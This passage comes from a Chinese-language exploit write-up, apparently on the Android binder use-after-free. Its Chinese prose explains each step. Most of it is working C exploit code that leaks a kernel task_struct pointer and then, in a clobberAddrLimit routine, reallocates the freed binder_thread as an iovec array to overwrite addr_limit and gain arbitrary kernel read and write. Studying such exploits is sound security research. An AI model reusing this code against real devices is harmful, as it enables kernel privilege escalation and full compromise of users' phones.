</span></span><span class=line><span class=cl>    <span class=c1>// Wait for the child process to exit
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>wait</span><span class=p>(</span><span class=n>nullptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>m_task_struct</span> <span class=o>=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>task_struct</span> <span class=o>*</span><span class=p>)</span> <span class=o>*</span><span class=p>((</span><span class=kt>int64_t</span> <span class=o>*</span><span class=p>)</span> <span class=p>(</span><span class=n>dataBuffer</span> <span class=o>+</span> <span class=n>TASK_STRUCT_OFFSET_IN_LEAKED_DATA</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>m_pidAddress</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>int8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_task_struct</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>task_struct</span><span class=p>,</span> <span class=n>pid</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>m_credAddress</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>int8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_task_struct</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>task_struct</span><span class=p>,</span> <span class=n>cred</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>m_nsproxyAddress</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>int8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_task_struct</span> <span class=o>+</span> <span class=n>offsetof</span><span class=p>(</span><span class=k>struct</span> <span class=n>task_struct</span><span class=p>,</span> <span class=n>nsproxy</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;[+] Leaked task_struct: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>m_task_struct</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] &amp;task_struct-&gt;pid: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>m_pidAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] &amp;task_struct-&gt;cred: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>m_credAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] &amp;task_struct-&gt;nsproxy: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>m_nsproxyAddress</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>很好理解，exp这部分首先初始化环境之后创建用于readv和writev的pipe，readv和writev函数用于在一次函数调用中读、写多个非连续缓冲区。修改pipe的size为0x1000。</p><p>之后创建了25个iovec，放在iovecStack里面。25个是根据binder_thread和iovec的大小算出来</p><p><code>IOVEC_WQ_INDEX (int) = (offsetof(struct binder_thread, wait) / sizeof(struct iovec))</code></p><p>binder_thread结构体大小为408，25个iovec大小为25*16=400，正好。计算对比<strong>binder_thread</strong>中wait.head的偏移0xA0和<strong>iovecStack</strong>的偏移iovecStack[10].iov_len匹配。</p><p><img src=https://my-md-1253484710.file.myqcloud.com/20200629155854.png loading=lazy></p><p>前面动态调试时也能看到会有两个地址的值会被写入地址，这里相对应的位置为iovecStack[10].iov_len 和iovecStack[11].io_base。所以我们这里要修改iovecStack[10]的iov_len和pipe一样的大小，阻塞掉父进程的writev系统调用，再去触发unlink操作。</p><p>这里的iovecStack[10].io_base正好对上binder_thread->wait.lock，如果这个值不为0的话，后面在尝试取自旋锁锁会出问题，不进行unlink操作，这个值是32bit的，iov_base是64bit的，所以要设置对齐，使用mmap保证低32bit为0。</p><p>iovecStack[10].iov_len和iovecStack[11].iov_len设置为pipe size的大小，iovecStack[11].io_base 设置为新分配的一个地址，</p><p>创建fork子进程进行EPOLL_CTL_DEL操作触发unlink。读出0x1000 bytes的垃圾数据恢复进程，</p><p>父进程free掉binder_thread，调用writev系统进行阻塞，等待子进程完成。</p><p>最后父进程在调用read读出已经被子进程覆盖了内核地址处的数据，根据偏移读出泄露的task_struct指针。</p><p>下面这张图是<strong>Project Zero</strong> blog贴出来的流程图，方便理解整个过程。</p><p><img src=https://my-md-1253484710.file.myqcloud.com/20200629014014.png loading=lazy></p><p>既然已经有task_struct指针，接下来就可以patch 掉AddrLimit。直接看exp实现。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=n>BinderUaF</span><span class=o>::</span><span class=n>clobberAddrLimit</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>sock_fd</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>ssize_t</span> <span class=n>nBytesWritten</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>msghdr</span> <span class=n>message</span> <span class=o>=</span> <span class=p>{</span><span class=n>nullptr</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>iovec</span> <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_COUNT</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=n>nullptr</span><span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Get binder fd
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>setupBinder</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Create event poll
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>setupEventPoll</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;[+] Setting up socket</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>socketpair</span><span class=p>(</span><span class=n>AF_UNIX</span><span class=p>,</span> <span class=n>SOCK_STREAM</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>sock_fd</span><span class=p>)</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] Unable to create socketpair</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[*] Socketpair created successfully</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// We will just write junk data to socket so that when recvmsg
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// is called it process the fist valid iovec with this junk data
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// and then blocks and waits for the rest of the data to be received
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>static</span> <span class=kt>char</span> <span class=n>junkSocketData</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=mh>0x41</span>
</span></span><span class=line><span class=cl>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;[+] Writing junk data to socket</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>nBytesWritten</span> <span class=o>=</span> <span class=n>write</span><span class=p>(</span><span class=n>sock_fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>junkSocketData</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>junkSocketData</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>nBytesWritten</span> <span class=o>!=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>junkSocketData</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>nBytesWritten</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>junkSocketData</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Write junk data to the socket so that when recvmsg is
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// called, it process the first valid iovec with this junk
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// data and then blocks for the rest of the incoming socket data
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>INFO</span><span class=p>(</span><span class=s>&#34;[+] Setting up iovecs</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// We want to block after processing the iovec at IOVEC_WQ_INDEX,
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// because then, we can trigger the unlink operation and get the
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// next iovecs corrupted to gain scoped write.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>mmap4gbAlignedPage</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=n>m_4gb_aligned_page</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=mh>0x41414141</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>2</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=mh>0x42424242</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>2</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=mh>0x8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Prepare the data buffer that will be written to socket
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Setting addr_limit to 0xFFFFFFFFFFFFFFFF in arm64
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// will result in crash because of a check in do_page_fault
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// However, x86_64 does not have this check. But it&#39;s better
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// to set it to 0xFFFFFFFFFFFFFFFE so that this same code can
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// be used in arm64 as well.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>static</span> <span class=kt>uint64_t</span> <span class=n>finalSocketData</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=mh>0x1</span><span class=p>,</span>                    <span class=c1>// iovecStack[IOVEC_WQ_INDEX].iov_len
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=mh>0x41414141</span><span class=p>,</span>             <span class=c1>// iovecStack[IOVEC_WQ_INDEX + 1].iov_base
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>,</span>  <span class=c1>// iovecStack[IOVEC_WQ_INDEX + 1].iov_len
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span> <span class=p>((</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=p>)</span> <span class=n>m_task_struct</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                        <span class=n>OFFSET_TASK_STRUCT_ADDR_LIMIT</span><span class=p>),</span> <span class=c1>// iovecStack[IOVEC_WQ_INDEX + 2].iov_base
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=mh>0xFFFFFFFFFFFFFFFE</span>      <span class=c1>// addr_limit value
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Prepare the message
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>message</span><span class=p>.</span><span class=n>msg_iov</span> <span class=o>=</span> <span class=n>iovecStack</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>message</span><span class=p>.</span><span class=n>msg_iovlen</span> <span class=o>=</span> <span class=n>IOVEC_COUNT</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Now link the poll wait queue to binder thread wait queue
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>linkEventPollWaitQueueToBinderThreadWaitQueue</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// We should trigger the unlink operation when we
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// have the binder_thread reallocated as iovec array
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=c1>// Now fork
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>pid_t</span> <span class=n>childPid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>childPid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// child process
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// There is a race window between the unlink and blocking
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// in writev, so sleep for a while to ensure that we are
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// blocking in writev before the unlink happens
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// Trigger the unlink operation on the reallocated chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>unlinkEventPollWaitQueueFromBinderThreadWaitQueue</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// Now, at this point, the iovecStack[IOVEC_WQ_INDEX].iov_len
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// and iovecStack[IOVEC_WQ_INDEX + 1].iov_base is clobbered
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>//
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// Write rest of the data to the socket so that recvmsg starts
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// processing the corrupted iovecs and we get scoped write and
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// finally arbitrary write
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>nBytesWritten</span> <span class=o>=</span> <span class=n>write</span><span class=p>(</span><span class=n>sock_fd</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>finalSocketData</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>finalSocketData</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>nBytesWritten</span> <span class=o>!=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>finalSocketData</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] write failed. nBytesWritten: 0x%lx, expected: 0x%lx&#34;</span><span class=p>,</span> <span class=n>nBytesWritten</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>finalSocketData</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_SUCCESS</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// parent process
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// I have seen some races which hinders the reallocation.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// So, now freeing the binder_thread after fork.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>freeBinderThread</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Reallocate binder_thread as iovec array and
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// we need to make sure this recvmsg call blocks.
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// recvmsg will block after processing a valid iovec at
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// iovecStack[IOVEC_WQ_INDEX]
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>ssize_t</span> <span class=n>nBytesReceived</span> <span class=o>=</span> <span class=n>recvmsg</span><span class=p>(</span><span class=n>sock_fd</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>message</span><span class=p>,</span> <span class=n>MSG_WAITALL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// If the corruption was successful, the total bytes received
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// should be equal to length of all iovec. This is because there
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// are three valid iovec
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>ssize_t</span> <span class=n>expectedBytesReceived</span> <span class=o>=</span> <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                                    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                                    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>2</span><span class=p>].</span><span class=n>iov_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>nBytesReceived</span> <span class=o>!=</span> <span class=n>expectedBytesReceived</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>ERR</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\t</span><span class=s>[-] recvmsg failed. nBytesReceived: 0x%lx, expected: 0x%lx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>nBytesReceived</span><span class=p>,</span> <span class=n>expectedBytesReceived</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Wait for the child process to exit
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>wait</span><span class=p>(</span><span class=n>nullptr</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里就要将addr_limit的值改为<code>0xFFFFFFFFFFFFFFFE</code>在arm64里有个检查函数<code>do_page_fault</code>会检测该值是否为<code>0xFFFFFFFFFFFFFFFF</code>，如果是就触发奔溃，所以一般都设为<code>0xFFFFFFFFFFFFFFFE</code>。</p><p>前面是从内核读出数据，这里要实现的是向内核写入数据。</p><p>看看这里的iovecStack结构：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=n>m_4gb_aligned_page</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=mh>0x41414141</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>1</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>2</span><span class=p>].</span><span class=n>iov_base</span> <span class=o>=</span> <span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=p>)</span> <span class=mh>0x42424242</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>iovecStack</span><span class=p>[</span><span class=n>IOVEC_WQ_INDEX</span> <span class=o>+</span> <span class=mi>2</span><span class=p>].</span><span class=n>iov_len</span> <span class=o>=</span> <span class=mh>0x8</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>和前面泄露信息的布局是差不多。</p><p>首先依然是初始化环境，先向socket写入了1byte的垃圾数据，之后父进程使用<code>recvmsg</code>系统调用接收了1byte的数据之后进行阻塞，这里选用了recvmsg而不是前面writev是因为iovecStack[10].iov_len变成了一个指针，很大的数字，后续调用copy_page_to_iter_iovec复制数据时会出错。</p><p>子进程进行unlink操作，将精心构造的finalSocketData写入socket，父进程恢复接收数据，这时iovecStack[11]已经被破坏掉了，等到recvmsg系统调用返回时，就可以修改掉addr_limit的值。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
